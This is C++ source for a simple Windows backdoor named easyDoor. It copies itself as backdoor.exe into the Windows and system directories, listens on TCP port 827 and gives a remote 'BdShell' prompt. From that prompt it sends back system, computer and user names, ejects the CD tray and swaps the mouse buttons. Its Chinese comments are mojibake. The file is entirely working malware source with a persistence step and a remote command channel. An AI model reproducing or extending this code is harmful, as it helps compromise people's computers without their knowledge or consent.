// easyDoor.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <Mmsystem.h>
#include <stdio.h>

#pragma comment (lib, "Winmm")
#pragma comment (lib, "ws2_32")

#define HELPMSG "help - Show Help Menu \r\n" \
                "getsysinfo - Get SysTem Information" \
                "open - Open The CDRom \r\n" \
                "close - Close The CDRom \r\n" \
                "swap - Swap Mouse Button \r\n" \
                "restore - Restore Mouse Button \r\n" \
                "exit - Quit BdShell"

#define NAME_LEN 20

typedef struct _SYS_INFO
{
    OSVERSIONINFO OsVer;            // �������ϵͳ��Ϣ
    char szComputerName[NAME_LEN];   // ����������
    char szUserName[NAME_LEN];       // ���浱ǰ��¼��
}SYS_INFO, *PSYS_INFO;

void GetSysInfo(PSYS_INFO SysInfo)
{
    unsigned long nSize = MAXBYTE;
    
    SysInfo->OsVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&SysInfo->OsVer);
    GetComputerName(SysInfo->szComputerName, &nSize);
    nSize = MAXBYTE;
    GetUserName(SysInfo->szUserName, &nSize);
}

VOID SetCdaudio(BOOL bOpen)
{
     if ( bOpen )
     {
         // �򿪹���
         mciSendString("set cdaudio door open", NULL, NULL, NULL);
     } 
     else
     {
         // �رչ���
         mciSendString("set cdaudio door closed", NULL, NULL, NULL);
     }
}

VOID SetMouseButton(BOOL bSwap)
{
    if ( bSwap)
    {
        // ����
        SwapMouseButton(TRUE);
    } 
    else
    {
        // �ָ�
        SwapMouseButton(FALSE);
    }
}

BOOL Dispatch(SOCKET sock, char *szCmd)
{
    BOOL bRet = FALSE;
    
    // ���ݲ�ͬ�������ɲ�ͬ����
    if ( !strcmp(szCmd, "help") )
    {
        send(sock, HELPMSG, strlen(HELPMSG) + sizeof(char), 0);
        bRet = TRUE;
    } 
    else if ( !strcmp(szCmd, "getsysinfo"))
    {
        SYS_INFO SysInfo = { 0 };
        GetSysInfo(&SysInfo);
        int n = send(sock, (const char *)&SysInfo, sizeof(SYS_INFO), 0);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "open") )
    {
        SetCdaudio(TRUE);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "close") )
    {
        SetCdaudio(FALSE);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "swap") )
    {
        SetMouseButton(TRUE);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "restore") )
    {
        SetMouseButton(FALSE);
        bRet = TRUE;
    }

    return bRet;
}

void CopySelf()
{
    // ������������·��
    char szSelfName[MAX_PATH] = { 0 };
    // ����WindowsĿ¼��·��
    char szWindowsPath[MAX_PATH] = { 0 };
    // ����ϵͳĿ¼��·��
    char szSystemPath[MAX_PATH] = { 0 };
    // ��ʱ·������
    char szTmpPath[MAX_PATH] = { 0 };
    
    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    GetWindowsDirectory(szWindowsPath, MAX_PATH);
    GetSystemDirectory(szSystemPath, MAX_PATH);
    
    strcat(szWindowsPath, "\\backdoor.exe");
    strcat(szSystemPath, "\\backdoor.exe");
    
    CopyFile(szSelfName, szWindowsPath, FALSE);
    CopyFile(szSelfName, szSystemPath, FALSE);
}

int main(int argc, char* argv[])
{
    // ��������wnidowsĿ¼��ϵͳĿ¼
    CopySelf();
    WSADATA wsaData;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET ServerSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in serveraddr;
    serveraddr.sin_family = PF_INET;
    serveraddr.sin_addr.S_un.S_addr = inet_addr("192.168.189.128");
    serveraddr.sin_port = htons(827);

    bind(ServerSock, (SOCKADDR*)&serveraddr, sizeof(sockaddr_in));

    listen(ServerSock, 1);
    printf("Listen ... \r\n");
    sockaddr_in clientaddr;
    SOCKET clientSock;
    int len = sizeof(sockaddr_in);

    clientSock = accept(ServerSock, (SOCKADDR*)&clientaddr, &len);

    printf("connected host info: \r\n");
    printf("Client ip   : %s \r\n", inet_ntoa(clientaddr.sin_addr));
    printf("Client port : %d \r\n", ntohs(clientaddr.sin_port));

    while ( TRUE )
    {
        // ����һ��������ʾ
        send(clientSock,
            "BdShell>",
            strlen("BdShell>") +sizeof(char),
            0);

        char buff[MAXBYTE] = { 0 };
        
        // ���տͻ��˷���������
        recv(clientSock, buff, MAXBYTE, 0);
        if ( !strcmp(buff, "exit") )
        {
            break;
        }

        // �ַ�����
        BOOL bRet = Dispatch(clientSock, buff);
        if ( bRet == FALSE )
        {
            send(clientSock,
                "Command Unsuccessfully!",
                strlen("Command Unsuccessfully!") + sizeof(char),
                0);
        } 
    }

    closesocket(clientSock);
    closesocket(ServerSock);

    WSACleanup();
    
	return 0;
}